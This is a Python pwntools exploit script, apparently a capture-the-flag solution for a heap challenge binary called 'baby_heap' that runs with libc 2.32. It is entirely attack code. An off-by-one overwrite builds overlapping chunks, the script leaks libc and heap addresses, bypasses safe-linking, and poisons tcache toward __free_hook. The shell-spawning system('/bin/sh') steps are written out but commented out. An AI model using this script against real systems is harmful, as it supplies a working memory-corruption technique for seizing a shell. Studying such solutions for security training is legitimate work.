from pwn import *

context.terminal = ['gnome-terminal', '-x', 'sh', '-c']
context.log_level = 'debug'


def qwq(name):
    log.success(hex(name))


def debug(point):
    if point == 0:
        gdb.attach(r)
    else:
        gdb.attach(r, 'b ' + str(point))


r = process('./baby_heap')
# r = remote('comentropy.cn', 8301)
libc = ELF('./libc-2.32.so')


def menu(choice):
    r.recvuntil(b"Your choice: ")
    r.sendline(str(choice))


def add(idx, size):
    menu(1)
    r.recvuntil(b"Enter the index: ")
    r.sendline(str(idx))
    r.recvuntil(b"Enter the Size: ")
    r.sendline(str(size))


def delete(idx):
    menu(2)
    r.recvuntil(b"Enter the index: ")
    r.sendline(str(idx))


def edit(idx, content):
    menu(3)
    r.recvuntil(b"Enter the index: ")
    r.sendline(str(idx))
    r.recvuntil(b"Enter the content: ")
    r.send(content)


def show(idx):
    menu(4)
    r.recvuntil(b"Enter the index: ")
    r.sendline(str(idx))


add(0, 0xc8)
[add(i, 0xd8) for i in range(0x1, 0x8)]
edit(0, b'a' * 0xc8 + b'\xf1')
delete(1)
add(1, 0xe0)
edit(1, b'a' * 0xd8 + p64(0x461) + b'\n')
delete(2)

add(2, 0xd8)
edit(2, b'a\n')
add(8, 0x10)
edit(8, b'\n')
show(8)
libc_base = u64(r.recvuntil(b'\x7f')[-6:].ljust(0x8, b'\0')) - 0x1e3c0a

delete(5)
delete(4)
add(4, 0xf8)
edit(4, b'a' * 0xc7 + b'\n')
show(4)
r.recvuntil(b'a' * 0xc7 + b'\n')
heap_base = u64(r.recv(6).ljust(0x8, b'\0')) - 0x10
key = heap_base >> 12
print(hex(key))
system_addr = libc_base + libc.sym["system"]
free_hook = libc_base + libc.sym["__free_hook"]
edit(4, b'a' * 0xc0 + p64(free_hook ^ key) + b'\n')
# add(5, 0xd0)
# add(9, 0xd0)
# edit(5, b'/bin/sh\x00\n')
# edit(9, p64(system_addr) + b'\n')

# debug('system')
# delete(5)
# qwq(libc_base)
# qwq(heap_base)
debug(0)
r.interactive()